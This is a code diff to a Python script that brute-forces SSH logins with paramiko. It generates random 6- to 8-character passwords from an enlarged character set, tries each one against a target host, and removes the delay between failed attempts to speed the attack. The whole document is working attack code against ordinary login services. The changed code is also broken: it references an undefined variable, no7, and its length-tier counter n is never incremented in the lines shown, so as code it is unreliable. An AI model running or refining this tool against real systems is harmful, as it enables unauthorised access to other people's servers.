@@ -3,7 +3,7 @@ import sys, time, paramiko, os, socket
 from random import randint
 global host, username, port, chars
 
-chars = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
+chars = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ".", ",", "@"]
 used = []
 port = 22
 try:
@@ -47,9 +47,22 @@ def ssh_connect(password, code = 0):
 	ssh.close()
 	return(code)
 
+n = 0
 while True:
-	no = randint(0, 61)
+	no = randint(0, 64)
+	no1 = randint(0,64)
+	no2 = randint(0,64)
+	no3 = randint(0,64)
+	no4 = randint(0,64)
+	no5 = randint(0,64)
+	no6 = randint(0,64)
 	password = chars[no]
+	if n < 391:
+		password = chars[no] + chars[no1] + chars[no2] + chars[no3] + chars[no4] + chars[no5]
+	elif n < 846:
+		password = chars[no] + chars[no1] + chars[no2] + chars[no3] + chars[no4] + chars[no5] + chars[no6]
+	elif n < 1366:
+		password = chars[no] + chars[no1] + chars[no2] + chars[no3] + chars[no4] + chars[no5] + chars[no6] + chars[no7]
 	if password not in used:
 		try:
 			response = ssh_connect(password)
@@ -60,7 +73,6 @@ while True:
 				break
 			elif response == 1:
 				print("'%s' not correct" % (password))
-				time.sleep(0.3)
 			elif response == 2:
 				print("[-] Connection could not be made (host down?)")
 				break
